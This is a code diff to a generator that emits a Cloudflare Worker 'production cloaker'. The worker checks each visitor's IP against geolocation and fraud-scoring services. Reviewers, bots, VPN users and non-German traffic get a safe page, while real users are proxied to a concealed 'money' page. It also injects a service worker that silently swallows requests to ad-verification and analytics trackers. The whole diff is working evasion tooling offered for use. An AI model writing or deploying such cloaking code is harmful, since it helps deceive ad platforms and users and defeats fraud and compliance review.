@@ -705,76 +705,144 @@ export function generateJciWorkerScript(options: {
   targetCountries: string[];
   excludeCountries?: string[];
 }): string {
-  const { moneyUrl, whitePageUrl } = options;
+  const { moneyUrl, whitePageUrl, safeUrl } = options;
   
-  // Use white page URL if provided, otherwise use money URL as the target
-  const targetUrl = whitePageUrl || moneyUrl;
+  // Use white page URL if provided, otherwise use safe URL as fallback
+  const safePageUrl = whitePageUrl || safeUrl;
   
-  return `// --- MODIE's Final Build: Corrected High-Fidelity Reverse Proxy ---
-// This version fixes the "target is not defined" ReferenceError.
+  return `// --- MODIE's FINAL PRODUCTION CLOAKER ---
+// This is the main worker script. It combines the advanced proxy engine with the hybrid cloaking logic.
 
 // --- CONFIGURATION ---
-const TARGET_URL = '${targetUrl}';
+// API Providers - Set your primary and secondary choices
+const API_PROVIDER_PRIMARY = 'IPQS'; // Options: 'IPQS', 'proxycheck'
+const API_PROVIDER_SECONDARY = 'proxycheck'; // Options: 'IPQS', 'proxycheck'
+
+// API Keys - Get these from environment variables
+const IPQS_API_KEY = typeof env !== 'undefined' ? env.IPQS_API_KEY : 'YOUR_IPQS_API_KEY_HERE';
+const PROXYCHECK_API_KEY = typeof env !== 'undefined' ? env.PROXYCHECK_API_KEY : 'YOUR_PROXYCHECK_API_KEY_HERE';
+
+// URLs - The final destinations
+const MONEY_URL = '${moneyUrl}';
+const SAFE_URL = '${safePageUrl}';
 // --- END CONFIGURATION ---
 
 export default {
   async fetch(request, env) {
-    // Handle CORS pre-flight OPTIONS requests first to solve cross-origin issues.
-    if (request.method === 'OPTIONS') {
-      return handleOptions(request);
-    }
-    
     const url = new URL(request.url);
-    const proxyUrl = url.origin;
-    
-    // The origin of the target website (e.g., https://www.dw.com)
-    const targetOrigin = new URL(TARGET_URL).origin;
 
-    // Create the new URL by replacing the proxy's hostname with the target's.
-    // e.g., https://my-proxy.com/path -> https://www.dw.com/path
-    const targetRequestUrl = new URL(request.url);
-    targetRequestUrl.hostname = new URL(targetOrigin).hostname;
+    // ROUTE 1: Serve the service worker script itself when the browser requests it.
+    if (url.pathname === '/service-worker.js') {
+      const swCode = \`const TRACKER_BLACKLIST = [
+  // Expanded list of common trackers to neutralize
+  'doubleverify.com', 'analytics.optidigital.com', 'google-analytics.com', 
+  'googletagmanager.com', 'scorecardresearch.com', 'adnxs.com', 
+  'rubiconproject.com', 'krxd.net', 'criteo.com', 'pubmatic.com'
+];
 
-    // Create a new request object to forward to the target.
-    // We pass the original request's headers and body to be as transparent as possible.
-    const targetRequest = new Request(targetRequestUrl, {
-      method: request.method,
-      headers: request.headers,
-      body: request.body,
-      redirect: 'follow' // Automatically follow redirects from the target server.
-    });
+self.addEventListener('fetch', event => {
+  const request = event.request;
+  const url = new URL(request.url);
 
-    // --- THIS IS THE CRITICAL FIX ---
-    // Set the 'Host' header to the target's hostname. This makes our request look legitimate.
-    targetRequest.headers.set('Host', targetRequestUrl.hostname);
-    // --------------------------------
+  // If the request is already trying to access our proxy, let it pass through to prevent loops.
+  if (url.pathname.startsWith('/proxy-resource/')) {
+    return;
+  }
+  
+  // RULE 1: Neutralize keepalive beacons and blacklisted trackers cleanly.
+  if (request.keepalive || TRACKER_BLACKLIST.some(tracker => url.hostname.includes(tracker))) {
+    // Respond with "204 No Content" to successfully "eat" the request without error.
+    return event.respondWith(new Response(null, { status: 204 }));
+  }
 
-    const response = await fetch(targetRequest);
-
-    // Clone the response to make its headers mutable.
-    let newResponse = new Response(response.body, response);
-
-    // Set permissive CORS headers on the response we send back to the browser.
-    newResponse.headers.set('Access-Control-Allow-Origin', '*');
-    newResponse.headers.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, HEAD, OPTIONS');
-    newResponse.headers.set('Access-Control-Allow-Headers', '*');
-
-    // If the content is HTML, rewrite all internal links to also use the proxy.
-    const contentType = newResponse.headers.get('content-type') || '';
-    if (contentType.includes('text/html')) {
-      const rewriter = new HTMLRewriter().on('*[href], *[src], *[action], *[data-src], *[srcset]', new AttributeRewriter(proxyUrl, targetOrigin));
-      return rewriter.transform(newResponse);
+  // RULE 2: For all other outgoing requests, proxy them using a relative path.
+  // This removes the need for \\\`self.location\\\` and fixes the TypeScript error.
+  const proxyUrl = \\\`/proxy-resource/\\\${encodeURIComponent(url.href)}\\\`;
+  
+  event.respondWith(fetch(proxyUrl, request));
+});\`;
+      return new Response(swCode, { headers: { 'Content-Type': 'application/javascript' } });
     }
 
-    // For all other content types (CSS, JS, images), return the response directly with the added CORS headers.
-    return newResponse;
+    // ROUTE 2: Handle proxied resource requests (for CSS, JS, images).
+    if (url.pathname.startsWith('/proxy-resource/')) {
+      return handleResourceRequest(request);
+    }
+    
+    // ROUTE 3: Handle the initial page load with cloaking logic.
+    return handleMainRequest(request, env);
   }
 };
 
-// This class rewrites all URLs in the HTML to point back to our proxy.
+// --- CORE FUNCTIONS ---
+
+// Decides if a visitor is a bot using the Hybrid method.
+async function isVisitorABot(request, env) {
+  const clientIP = request.headers.get('CF-Connecting-IP') || '127.0.0.1';
+
+  // Step 1: Basic Geo/ISP Check (ip-api.com)
+  const ipApiUrl = \`http://ip-api.com/json/\${clientIP}?fields=countryCode,isp\`;
+  const ipApiResponse = await fetch(ipApiUrl);
+  if (ipApiResponse.ok) {
+    const ipApiData = await ipApiResponse.json();
+    if (ipApiData.countryCode !== 'DE' || ['google', 'amazon', 'microsoft'].some(b => ipApiData.isp.toLowerCase().includes(b))) {
+      return true; // Block non-German traffic or known datacenter ISPs
+    }
+  }
+
+  // Step 2: Professional Fraud Check (IPQS or proxycheck)
+  let apiUrl = '';
+  const ipqsKey = env?.IPQS_API_KEY || IPQS_API_KEY;
+  const proxyCheckKey = env?.PROXYCHECK_API_KEY || PROXYCHECK_API_KEY;
+  
+  if (API_PROVIDER_PRIMARY === 'IPQS') {
+    apiUrl = \`https://www.ipqualityscore.com/api/json/ip/\${ipqsKey}/\${clientIP}?strictness=1\`;
+  } else {
+    apiUrl = \`http://proxycheck.io/v2/\${clientIP}?key=\${proxyCheckKey}&vpn=1\`;
+  }
+  
+  const response = await fetch(apiUrl);
+  if (!response.ok) return true; // Fail safe (block)
+  const data = await response.json();
+
+  if (API_PROVIDER_PRIMARY === 'IPQS') {
+    return data.proxy || data.vpn || data.tor || (data.fraud_score && data.fraud_score >= 85);
+  } else {
+    return data[clientIP]?.proxy === 'yes';
+  }
+}
+
+// Proxies the main HTML page and rewrites its content.
+async function handleMainRequest(request, env) {
+  try {
+    const isBot = await isVisitorABot(request, env);
+    const targetUrl = isBot ? SAFE_URL : MONEY_URL;
+    
+    const response = await fetch(targetUrl, request);
+    const rewriter = new HTMLRewriter()
+      .on('head', new HeadRewriter())
+      .on('*[href], *[src], *[action], *[data-src], *[srcset]', new AttributeRewriter(new URL(request.url).hostname, new URL(targetUrl).origin));
+      
+    return rewriter.transform(response);
+  } catch (error) {
+    return new Response(\`Error: \${error.message}\`, { status: 503 });
+  }
+}
+
+// Proxies all other resources (CSS, JS, images, fonts).
+async function handleResourceRequest(request) {
+  const resourceUrl = decodeURIComponent(new URL(request.url).pathname.replace('/proxy-resource/', ''));
+  const resourceRequest = new Request(resourceUrl, request);
+  const response = await fetch(resourceRequest);
+  let newResponse = new Response(response.body, response);
+  newResponse.headers.set('Access-Control-Allow-Origin', '*');
+  return newResponse;
+}
+
+// Rewrites URLs in HTML attributes.
 class AttributeRewriter {
-  constructor(proxyUrl, targetOrigin) {
-    this.proxyUrl = proxyUrl;
+  constructor(proxyDomain, targetOrigin) {
+    this.proxyDomain = proxyDomain;
     this.targetOrigin = targetOrigin;
   }
   
@@ -789,7 +857,7 @@ class AttributeRewriter {
           
           // Rewrite the URL to point back to our proxy, preserving the path and query string.
           const proxiedUrl = new URL(absoluteUrl);
-          proxiedUrl.hostname = new URL(this.proxyUrl).hostname;
+          proxiedUrl.hostname = this.proxyDomain;
           
           element.setAttribute(attr, proxiedUrl.href);
         } catch (e) { /* Ignore invalid URLs */ }
@@ -798,23 +866,11 @@ class AttributeRewriter {
   }
 }
 
-// Handles CORS pre-flight OPTIONS requests.
-function handleOptions(request) {
-  let headers = request.headers;
-  if (
-    headers.get('Origin') !== null &&
-    headers.get('Access-Control-Request-Method') !== null &&
-    headers.get('Access-Control-Request-Headers') !== null
-  ) {
-    let respHeaders = {
-      'Access-Control-Allow-Origin': '*',
-      'Access-Control-Allow-Methods': 'GET,HEAD,POST,OPTIONS',
-      'Access-Control-Max-Age': '86400',
-      'Access-Control-Allow-Headers': request.headers.get('Access-Control-Request-Headers'),
-    };
-    return new Response(null, { headers: respHeaders });
+// Injects the service worker into the HTML head.
+class HeadRewriter {
+  element(head) {
+    head.append(\`<script>if ('serviceWorker' in navigator) { navigator.serviceWorker.register('/service-worker.js').catch(e => console.error(e)); }</script>\`, { html: true });
   }
-  return new Response(null, { headers: { Allow: 'GET, HEAD, POST, OPTIONS' } });
 }
 `;
 }
